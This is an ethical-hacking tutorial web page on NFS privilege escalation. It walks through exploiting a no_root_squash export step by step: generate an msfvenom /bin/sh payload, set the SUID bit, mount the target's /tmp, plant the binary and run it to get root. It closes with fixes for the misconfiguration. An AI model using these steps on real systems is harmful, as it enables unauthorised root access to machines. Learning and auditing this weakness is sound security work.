<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>NFS Exploits - Rare Code Base</title>

    <meta name="description"
        content="Discover how NFS misconfigurations can lead to privilege escalation on Linux systems. Explore practical examples, real-world scenarios, and detailed walkthroughs to gain root access and enhance your ethical hacking skills.">

    <link rel="stylesheet" href="/css/styles.css">
    <link rel="icon" href="/favicon.ico" type="image/x-icon">

    <script src="/js/main.js" defer></script>
    <script src="/js/sidebar.js" defer></script>
</head>

<body>

    <div id="navbar-placeholder"></div>

    <main class="d-lg-flex flex-nowrap d-block">

        <div id="sidebar-placeholder"></div>

        <div class="content p-4">
            <h1 class="mt-4">NFS (Network File System) Exploit</h1>

            <h2 class="mt-5">What is NFS?</h2>
            <p>
                NFS (Network File System) is a protocol that allows a machine to share directories across the network.
                Other systems can mount these shared folders and access them like local directories.
            </p>

            <h3 class="mt-4">How Misconfigurations Can Be Dangerous</h3>
            <p>
                A common dangerous configuration is the use of <code>no_root_squash</code>, which allows remote root
                users to keep their root privileges on the NFS-mounted folder.
            </p>

            <h3 class="mt-4">Target System’s Exported Folders</h3>
            <p>On the target machine, check exported NFS directories with:</p>
            <pre><code>$ cat /etc/exports</code></pre>
            <p>Example output:</p>
            <pre><code>/var/www *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)</code></pre>

            <p>
                The <code>/tmp</code> directory is exported with <code>no_root_squash</code>, which means any file
                created from a remote machine by root will be treated as owned by root on the target too.
            </p>

            <h3 class="mt-4">Step-by-Step: NFS Privilege Escalation via /tmp</h3>
            <ol>
                <li>
                    <strong>Generate the Shell Payload:</strong>
                    <pre><code># msfvenom -p linux/x64/exec CMD="/bin/sh" -f elf -o shell</code></pre>
                    <p>This will generate a payload that executes <code>/bin/sh</code> on the target machine when
                        triggered.</p>
                </li>

                <li>
                    <strong>Set SUID on the Payload:</strong>
                    <p>Make the payload executable with root privileges by setting the <code>SUID</code> bit:</p>
                    <pre><code># chmod +s shell</code></pre>
                    <p>This ensures that the file will execute with root privileges, even if it's run by a
                        non-privileged user.</p>
                </li>

                <li>
                    <strong>Create Mount Point and Mount NFS Share:</strong>
                    <p>We’ll mount the target’s <code>/tmp</code> directory to <code>/tmp/nfs</code> locally:</p>
                    <pre><code># mkdir /tmp/nfs
# mount -o rw TARGET-IP:/tmp /tmp/nfs</code></pre>
                </li>

                <li>
                    <strong>Copy the Payload to the Target System:</strong>
                    <p>This will copy the payload to the real <code>/tmp</code> folder on the target machine, owned by
                        root:</p>
                    <pre><code># cp shell /tmp/nfs/root_shell
# chmod +x /tmp/nfs/root_shell</code></pre>
                </li>

                <li>
                    <strong>Trigger the Payload on the Target:</strong>
                    <p>From a shell on the target system (even as a low-priv user):</p>
                    <pre><code>$ /tmp/root_shell</code></pre>
                    <p>If successful, you will have a shell with root privileges:</p>
                    <pre><code>whoami
root</code></pre>
                </li>
            </ol>

            <h3 class="mt-4">Why This Works</h3>
            <p>
                The <code>SUID</code> bit allows the file to execute with the permissions of the file owner (usually
                root). Since the file is copied to <code>/tmp</code> (where it's owned by root) and the
                <code>SUID</code> bit is set, even a non-root user can execute the file and gain root privileges.
            </p>

            <h3 class="mt-4">Fixing the Issue</h3>
            <ul>
                <li>Never use <code>no_root_squash</code> unless absolutely required.</li>
                <li>Restrict NFS access to specific IPs or subnets.</li>
                <li>Use firewalls to block NFS (port 2049) from untrusted sources.</li>
                <li>Regularly audit <code>/etc/exports</code> and remove insecure entries.</li>
            </ul>

            <h3 class="mt-4">Conclusion</h3>
            <p>
                NFS misconfigurations like exporting <code>/tmp</code> with <code>no_root_squash</code> are highly
                dangerous.
                As demonstrated, attackers can escalate privileges to root by setting the <code>SUID</code> bit on
                payloads and executing them remotely.
                Always secure NFS shares and test for such vulnerabilities in controlled environments.
            </p>
        </div>


        </div>

    </main>

    <div id="footer-placeholder"></div>

</body>

</html>